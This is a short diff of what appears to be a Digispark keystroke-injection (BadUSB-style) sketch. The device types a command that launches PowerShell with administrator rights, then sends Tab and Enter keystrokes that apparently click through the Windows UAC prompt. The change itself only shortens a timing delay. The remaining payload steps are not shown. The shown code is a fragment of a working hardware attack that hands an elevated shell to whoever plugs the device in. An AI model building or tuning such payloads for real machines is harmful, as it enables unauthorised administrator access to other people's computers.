@@ -52,7 +52,7 @@ pisca_led(100);
   DigiKeyboard.println("powershell start-process powershell -verb runas");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(1000);
+  DigiKeyboard.delay(500);
   DigiKeyboard.print("\t\t");
   DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
